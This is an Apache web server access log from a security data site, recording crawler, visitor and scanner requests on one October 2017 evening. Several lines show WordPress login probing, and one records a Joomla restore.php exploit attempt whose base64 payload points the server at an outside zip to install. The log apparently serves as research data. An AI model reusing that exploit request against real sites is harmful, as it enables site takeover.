216.244.66.227 - - [10/Oct/2017:18:19:04 -0700] "GET /self.logs/access.log.2017-09-23.gz HTTP/1.1" 200 26031 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
116.24.65.108 - - [10/Oct/2017:18:19:55 -0700] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 200 17655 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
68.51.52.238 - - [10/Oct/2017:18:22:18 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/61.0.3163.100 Chrome/61.0.3163.100 Safari/537.36" 
216.244.66.250 - - [10/Oct/2017:18:23:40 -0700] "GET /self.logs/ HTTP/1.1" 200 54301 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
115.164.56.240 - - [10/Oct/2017:18:24:46 -0700] "GET /wp-login.php HTTP/1.0" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
115.164.56.240 - - [10/Oct/2017:18:24:51 -0700] "GET /wp-login.php HTTP/1.0" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
115.164.56.240 - - [10/Oct/2017:18:24:57 -0700] "GET / HTTP/1.0" 200 37404 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
130.85.247.226 - - [10/Oct/2017:18:25:19 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.38 Safari/537.36" 
130.85.247.226 - - [10/Oct/2017:18:25:19 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.38 Safari/537.36" 
116.24.65.108 - - [10/Oct/2017:18:27:14 -0700] "GET /self.logs/2016/ HTTP/1.1" 200 7741 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
116.24.65.108 - - [10/Oct/2017:18:28:15 -0700] "GET /self.logs/administrator/components/com_joomlaupdate/restore.php?task=stepRestore&factory=Tzo5OiJBS0ZhY3RvcnkiOjE6e3M6MTg6IgBBS0ZhY3RvcnkAdmFybGlzdCI7YToyOntzOjI3OiJraWNrc3RhcnQuc2VjdXJpdHkucGFzc3dvcmQiO3M6MDoiIjtzOjI2OiJraWNrc3RhcnQuc2V0dXAuc291cmNlZmlsZSI7czo0NDoiaHR0cDovL2VjZWxsLm5pdHJrbC5hYy5pbi9pcGl6cG0vd3Q1Mjg5bi56aXAiO319 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
116.24.65.108 - - [10/Oct/2017:18:28:26 -0700] "GET /self.logs/administrator/components/com_joomlaupdate/restore.php?task=stepRestore HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
116.24.65.108 - - [10/Oct/2017:18:28:33 -0700] "GET /self.logs/administrator/ HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
116.24.65.108 - - [10/Oct/2017:18:28:41 -0700] "GET /self.logs/administrator/ HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
120.221.0.34 - - [10/Oct/2017:18:31:09 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
116.24.65.108 - - [10/Oct/2017:18:17:43 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 54258816 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" 
216.244.66.227 - - [10/Oct/2017:18:48:02 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
202.246.252.102 - - [10/Oct/2017:18:51:26 -0700] "GET / HTTP/1.0" 200 37415 "https://www.google.co.jp/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
202.246.252.102 - - [10/Oct/2017:18:51:28 -0700] "GET /GitHub-Mark.png HTTP/1.0" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
202.246.252.102 - - [10/Oct/2017:18:51:28 -0700] "GET /twitter-icon.png HTTP/1.0" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
202.246.252.102 - - [10/Oct/2017:18:51:29 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.0" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
216.244.66.227 - - [10/Oct/2017:18:54:02 -0700] "GET /self.logs/2015/error.log.2015-03-09.gz HTTP/1.1" 200 2189 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:03 -0700] "GET /self.logs/2015/error.log.2015-04-09.gz HTTP/1.1" 200 515 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:04 -0700] "GET /self.logs/2015/error.log.2015-08-08.gz HTTP/1.1" 200 676 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:05 -0700] "GET /self.logs/2016/access.log.2016-07-05.gz HTTP/1.1" 200 21053 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:06 -0700] "GET /self.logs/2016/access.log.2016-08-07.gz HTTP/1.1" 200 13532 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:08 -0700] "GET /self.logs/2016/access.log.2016-12-11.gz HTTP/1.1" 200 14450 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:09 -0700] "GET /self.logs/2016/error.log.2016-02-02.gz HTTP/1.1" 200 628 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:10 -0700] "GET /self.logs/2016/error.log.2016-04-02.gz HTTP/1.1" 200 557 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:11 -0700] "GET /self.logs/2016/error.log.2016-05-01.gz HTTP/1.1" 200 827 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:12 -0700] "GET /self.logs/2016/error.log.2016-07-14.gz HTTP/1.1" 200 578 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:18:54:14 -0700] "GET /self.logs/2016/error.log.2016-10-06.gz HTTP/1.1" 200 750 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
72.9.151.194 - - [10/Oct/2017:18:57:49 -0700] "GET / HTTP/1.0" 200 37404 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" 
151.80.39.157 - - [10/Oct/2017:19:01:05 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
151.80.39.157 - - [10/Oct/2017:19:01:05 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
157.55.39.166 - - [10/Oct/2017:19:05:09 -0700] "GET /self.logs/access.log.2017-07-10.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
27.72.89.185 - - [10/Oct/2017:19:07:27 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 54106811 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0" 
115.164.56.240 - - [10/Oct/2017:19:09:33 -0700] "GET /wp-login.php HTTP/1.0" 301 485 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
115.164.56.240 - - [10/Oct/2017:19:09:34 -0700] "GET /wp-login.php HTTP/1.0" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
115.164.56.240 - - [10/Oct/2017:19:09:40 -0700] "GET /wp-login.php HTTP/1.0" 301 485 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
115.164.56.240 - - [10/Oct/2017:19:09:41 -0700] "GET /wp-login.php HTTP/1.0" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
115.164.56.240 - - [10/Oct/2017:19:09:48 -0700] "GET / HTTP/1.0" 301 461 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
115.164.56.240 - - [10/Oct/2017:19:09:48 -0700] "GET / HTTP/1.0" 200 37404 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
66.249.64.159 - - [10/Oct/2017:19:10:43 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
157.55.39.166 - - [10/Oct/2017:19:10:44 -0700] "GET /self.logs/error.log.2015-03-12.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
120.221.1.28 - - [10/Oct/2017:19:12:32 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 304 155 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
216.244.66.227 - - [10/Oct/2017:19:17:19 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:12 -0700] "GET /self.logs/2015/access.log.2015-05-30.gz HTTP/1.1" 200 3004 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:13 -0700] "GET /self.logs/2015/error.log.2015-02-08.gz HTTP/1.1" 200 1001 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:14 -0700] "GET /self.logs/2015/error.log.2015-03-24.gz HTTP/1.1" 200 1471 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:15 -0700] "GET /self.logs/2015/error.log.2015-07-04.gz HTTP/1.1" 200 761 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:16 -0700] "GET /self.logs/2015/error.log.2015-07-28.gz HTTP/1.1" 200 586 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:17 -0700] "GET /self.logs/2015/error.log.2015-09-21.gz HTTP/1.1" 200 824 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:18 -0700] "GET /self.logs/2015/error.log.2015-12-31.gz HTTP/1.1" 200 547 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:19 -0700] "GET /self.logs/2016/access.log.2016-01-10.gz HTTP/1.1" 200 6996 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:20 -0700] "GET /self.logs/2016/access.log.2016-05-07.gz HTTP/1.1" 200 8153 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:21 -0700] "GET /self.logs/2016/access.log.2016-08-31.gz HTTP/1.1" 200 8427 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:22 -0700] "GET /self.logs/2016/access.log.2016-09-06.gz HTTP/1.1" 200 8349 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:23 -0700] "GET /self.logs/2016/access.log.2016-11-11.gz HTTP/1.1" 200 7732 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:24 -0700] "GET /self.logs/2016/error.log.2016-01-02.gz HTTP/1.1" 200 793 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:25 -0700] "GET /self.logs/2016/error.log.2016-01-19.gz HTTP/1.1" 200 581 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:26 -0700] "GET /self.logs/2016/error.log.2016-07-22.gz HTTP/1.1" 200 1243 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:27 -0700] "GET /self.logs/2016/error.log.2016-08-04.gz HTTP/1.1" 200 2145 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:20:28 -0700] "GET /self.logs/error.log.2017-09-28.gz HTTP/1.1" 200 2122 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
122.193.143.37 - - [10/Oct/2017:19:22:05 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
122.193.143.37 - - [10/Oct/2017:19:22:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
23.237.4.26 - - [10/Oct/2017:19:24:45 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)" 
23.237.4.26 - - [10/Oct/2017:19:24:46 -0700] "GET / HTTP/1.1" 200 37415 "-" "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)" 
202.223.143.114 - - [10/Oct/2017:19:25:02 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0" 
27.72.89.185 - - [10/Oct/2017:19:24:16 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 391366811 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0" 
52.212.146.96 - - [10/Oct/2017:19:30:02 -0700] "GET /self.logs/access.log.2017-10-04.gz HTTP/1.1" 200 32541 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Oct/2017:19:30:03 -0700] "GET /self.logs/access.log.2017-10-05.gz HTTP/1.1" 200 29914 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Oct/2017:19:30:03 -0700] "GET /self.logs/access.log.2017-10-06.gz HTTP/1.1" 200 33318 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Oct/2017:19:30:03 -0700] "GET /self.logs/access.log.2017-10-07.gz HTTP/1.1" 200 26519 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Oct/2017:19:30:04 -0700] "GET /self.logs/access.log.2017-10-08.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Oct/2017:19:30:04 -0700] "GET /self.logs/access.log.2017-10-09.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Oct/2017:19:30:04 -0700] "GET /self.logs/access.log.2017-10-10.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
27.72.89.185 - - [10/Oct/2017:19:34:47 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 72782363 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0" 
103.7.29.7 - - [10/Oct/2017:19:35:29 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
31.168.25.208 - - [10/Oct/2017:19:35:33 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
101.226.68.161 - - [10/Oct/2017:19:35:38 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) \t\t\tChrome/55.0.2883.95 Safari/537.36" 
31.168.25.208 - - [10/Oct/2017:19:35:39 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
31.168.25.208 - - [10/Oct/2017:19:35:44 -0700] "GET / HTTP/1.1" 200 37415 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
103.7.29.7 - - [10/Oct/2017:19:35:52 -0700] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
101.226.33.220 - - [10/Oct/2017:19:36:02 -0700] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36" 
24.84.138.49 - - [10/Oct/2017:19:40:40 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko)" 
24.84.138.49 - - [10/Oct/2017:19:40:40 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/12604.1.38.1.7 CFNetwork/811.5.4 Darwin/16.7.0 (x86_64)" 
24.84.138.49 - - [10/Oct/2017:19:40:40 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/12604.1.38.1.7 CFNetwork/811.5.4 Darwin/16.7.0 (x86_64)" 
24.84.138.49 - - [10/Oct/2017:19:40:40 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/12604.1.38.1.7 CFNetwork/811.5.4 Darwin/16.7.0 (x86_64)" 
24.84.138.49 - - [10/Oct/2017:19:40:41 -0700] "GET / HTTP/1.1" 200 11060 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.3 Mobile/14E277 Safari/603.1.30" 
24.84.138.49 - - [10/Oct/2017:19:40:41 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/12604.1.38.1.7 CFNetwork/811.5.4 Darwin/16.7.0 (x86_64)" 
24.84.138.49 - - [10/Oct/2017:19:40:41 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/12604.1.38.1.7 CFNetwork/811.5.4 Darwin/16.7.0 (x86_64)" 
24.84.138.49 - - [10/Oct/2017:19:40:41 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/12604.1.38.1.7 CFNetwork/811.5.4 Darwin/16.7.0 (x86_64)" 
182.140.168.140 - - [10/Oct/2017:19:42:15 -0700] "GET /tg/a.zip HTTP/1.1" 200 52560 "http://dlc2.pconline.com.cn/filedown_358004_6953099/wmkq60sx/makesigngif.zip" "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.0 Mobile Safari/537.36" 
216.244.66.227 - - [10/Oct/2017:19:42:18 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
61.151.226.16 - - [10/Oct/2017:19:42:24 -0700] "GET /tg/a.zip HTTP/1.1" 200 160600 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
103.7.29.7 - - [10/Oct/2017:19:42:14 -0700] "GET /tg/a.zip HTTP/1.1" 200 66189337 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
216.244.66.227 - - [10/Oct/2017:19:46:35 -0700] "GET /self.logs/2015/access.log.2015-07-02.gz HTTP/1.1" 200 3937 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:36 -0700] "GET /self.logs/2015/access.log.2015-10-28.gz HTTP/1.1" 200 19970 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:37 -0700] "GET /self.logs/2015/access.log.2015-11-11.gz HTTP/1.1" 200 5130 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
103.7.29.7 - - [10/Oct/2017:19:46:35 -0700] "GET /misc/zeus_dga_domains.txt.zip HTTP/1.1" 200 594360 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
216.244.66.227 - - [10/Oct/2017:19:46:38 -0700] "GET /self.logs/2015/access.log.2015-11-21.gz HTTP/1.1" 200 5303 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:39 -0700] "GET /self.logs/2015/access.log.2015-12-15.gz HTTP/1.1" 200 8769 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:40 -0700] "GET /self.logs/2015/error.log.2015-04-27.gz HTTP/1.1" 200 593 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:41 -0700] "GET /self.logs/2015/error.log.2015-08-12.gz HTTP/1.1" 200 891 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:42 -0700] "GET /self.logs/2015/error.log.2015-09-26.gz HTTP/1.1" 200 600 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:43 -0700] "GET /self.logs/2015/error.log.2015-11-29.gz HTTP/1.1" 200 557 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:44 -0700] "GET /self.logs/2016/access.log.2016-02-09.gz HTTP/1.1" 200 9279 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:45 -0700] "GET /self.logs/2016/access.log.2016-06-12.gz HTTP/1.1" 200 13440 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:47 -0700] "GET /self.logs/2016/error.log.2016-06-12.gz HTTP/1.1" 200 1104 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:47 -0700] "GET /self.logs/2016/access.log.2016-08-14.gz HTTP/1.1" 200 13014 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:48 -0700] "GET /self.logs/2016/error.log.2016-07-28.gz HTTP/1.1" 200 634 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:49 -0700] "GET /self.logs/2016/error.log.2016-08-10.gz HTTP/1.1" 200 586 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:50 -0700] "GET /self.logs/2016/error.log.2016-08-17.gz HTTP/1.1" 200 922 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:51 -0700] "GET /self.logs/2016/error.log.2016-10-12.gz HTTP/1.1" 200 1210 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.227 - - [10/Oct/2017:19:46:52 -0700] "GET /self.logs/2016/error.log.2016-11-27.gz HTTP/1.1" 200 1776 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
103.7.29.7 - - [10/Oct/2017:19:48:38 -0700] "GET /self.logs/ HTTP/1.1" 200 5994 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
36.74.181.243 - - [10/Oct/2017:19:48:59 -0700] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
36.74.181.243 - - [10/Oct/2017:19:48:59 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
